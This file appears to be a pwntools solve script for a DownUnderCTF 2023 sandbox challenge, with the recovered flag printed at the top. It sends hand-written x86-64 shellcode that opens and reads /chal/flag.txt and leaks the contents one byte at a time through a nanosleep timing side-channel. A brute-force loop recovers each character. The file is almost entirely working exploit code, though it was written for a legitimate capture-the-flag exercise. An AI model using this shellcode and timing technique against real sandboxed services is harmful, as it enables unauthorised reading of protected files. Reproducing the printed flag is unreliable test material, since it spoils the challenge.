# DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}
from pwn import *
import time


# initialize the binary
binary = "./escape"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break *(main+197)
continue
"""

flag = ''
def run(i):
    global flag
    if args.REMOTE:
        p = remote("2023.ductf.dev", 30010)
    elif args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p = elf.process()

    p.recvline()

    # flag location - /chal/flag.txt
    # we only get 127 bytes of shellcode
    payload = f'''
    // openat(0, "/chal/flag.txt", 0)
    // dirfd is ignored, 0 is READONLY
    OPENAT:
    mov rax, 257
    mov rdi, 0
    mov rsi, 0x7478742e6761
    push rsi
    mov rsi, 0x6c662f6c6168632f
    push rsi
    mov rsi, rsp
    mov rdx, 0
    syscall

    // read(3, rsp, 0x100)
    READ:
    mov rdi, rax
    mov rax, 0
    mov rdx, 0x100
    syscall

    // compare
    COMPARE:
    add rsp, {hex(len(flag))}
    mov al, byte ptr [rsp]
    cmp al, {hex(ord(i))}
    je NANOSLEEP;

    // exit
    EXIT:
    mov rax, 60
    syscall

    // nanosleep(*-->0x2, 0)
    NANOSLEEP:
    mov QWORD PTR [rbx], 0x5
    mov rdi, rbx
    mov rsi, 0
    mov rax, 35
    syscall
    '''

    compiled = asm(payload)
    #print(f'len: {len(compiled)}')

    p.sendline(compiled)


    start_time = time.time()
    try:
        p.recvline()
    except EOFError:
        pass
    diff = time.time() - start_time

    p.close()
    return diff


### START LOOP ###
while '}' not in flag:
    for letter in string.printable:
        diff = run(letter)
        print(f'{letter} - {diff}')

        if diff > 0.19:
            print("Testing again...")

            if run(letter) > 0.19:
                print("FOUND IT", letter)
                flag += letter
                print(f'Flag: {flag}')
                break
            else:
                print("False positive")